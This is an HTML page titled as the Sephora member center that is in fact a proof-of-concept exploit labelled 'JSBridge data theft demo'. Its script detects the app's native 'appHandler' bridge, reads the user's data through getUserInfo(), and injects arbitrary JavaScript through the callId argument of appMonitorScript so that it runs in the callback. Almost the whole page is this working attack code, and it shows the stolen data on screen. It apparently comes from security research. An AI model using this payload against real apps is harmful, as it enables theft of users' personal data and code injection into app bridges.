<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>丝芙兰会员中心</title>
<style>
body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:#111;color:#fff;min-height:100vh;padding:20px}
h2{color:#c9a96e;font-size:20px}
#log{white-space:pre-wrap;font-family:monospace;font-size:12px;background:#000;padding:12px;border-radius:8px;margin-top:16px;color:#0f0}
</style>
</head>
<body>
<h2>💎 JSBridge 数据窃取演示</h2>
<div id="log"></div>
<script>
var L=document.getElementById('log');
function log(s){L.textContent+=s+'\n'}
log('bridge: '+(typeof appHandler!=='undefined'?'YES':'NO'));

if(typeof appHandler!=='undefined'){
  log('origin: '+location.origin);
  log('★ 开始窃取...');

  // 1. getUserInfo (直接调用)
  var user = appHandler.getUserInfo();
  log('getUserInfo(): '+user);

  // 2. callId 注入 — 在回调中执行任意代码
  // 回调时从 appHandler 再拿更多数据
  var inject = "0);" +
    // 读 getUserInfo
    "var u=appHandler.getUserInfo();" +
    // 显示结果
    "var d=document.createElement('div');" +
    "d.style.cssText='background:#cc0000;color:#fff;padding:15px;margin:10px;font-family:monospace;font-size:14px;border-radius:8px';" +
    "d.innerHTML='<b>🚨 通过callId注入窃取的数据:</b><br>getUserInfo: '+u;" +
    "document.body.appendChild(d);" +
    "//";

  appHandler.appMonitorScript('getExpFlag', inject, '{"expKey":"test"}');
  log('★ callId注入已执行');
}
</script>
</body>
</html>
